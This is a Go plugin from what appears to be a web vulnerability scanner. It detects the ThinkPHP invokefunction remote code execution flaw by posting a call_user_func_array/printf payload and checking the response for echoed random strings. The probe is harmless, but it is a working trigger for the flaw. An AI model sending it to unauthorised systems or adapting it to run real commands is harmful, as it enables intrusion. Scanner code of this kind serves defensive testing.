/**
* @Author: shaochuyu
* @Date: 5/7/2022 11:30
 */
package thinkphp

import (
	"context"
	"fmt"
	"strings"
	"wscan/core/http"
	"wscan/core/model"
	"wscan/core/plugins/base"
	"wscan/core/utils"
	logger "wscan/core/utils/log"
)

type InvokeRce struct {
}

func (*InvokeRce) Finger() *base.Finger {
	return &base.Finger{
		CheckAction: func(ctx context.Context, ab *base.Apollo) error {
			flow := ab.GetTargetFlow()
			logger.Debugf("Start detection thinkphp/rce/invoke, %s", flow.Request.URL())
			r1 := utils.RandLetters(8)
			r2 := utils.RandLetters(8)
			payload := "function=call_user_func_array&vars[0]=printf&vars[1][]={{r1}}%25%25{{r2}}"
			payload = strings.Replace(payload, "{{r1}}", r1, -1)
			payload = strings.Replace(payload, "{{r2}}", r2, -1)
			reqUrl, err := flow.Request.URL().Parse("/index.php?s=/Index/\\think\\app/invokefunction")
			if err != nil {
				logger.Error(err)
				return nil
			}

			req, err := http.NewRequest("POST", reqUrl.String(), strings.NewReader(payload))
			if err != nil {
				logger.Error(err)
				return nil
			}
			res, err := ab.HTTPClient.Respond(ctx, req)
			if err != nil {
				return nil
			}

			if strings.Contains(res.Text, fmt.Sprintf("%s%%%s1", r1, r2)) {
				v := ab.NewWebVuln(req, res, nil)
				if v != nil {
					v.SetTargetURL(flow.Request.URL())
					v.Payload = payload
					ab.OutputVuln(v)
				}
			}
			return nil
		},
		Channel: "website",
		Binding: &model.VulnBinding{ID: "thinkphp/rce/invoke", Plugin: "thinkphp/rce/invoke", Category: "thinkphp/rce/invoke", Severity: model.SeverityCritical},
	}
}
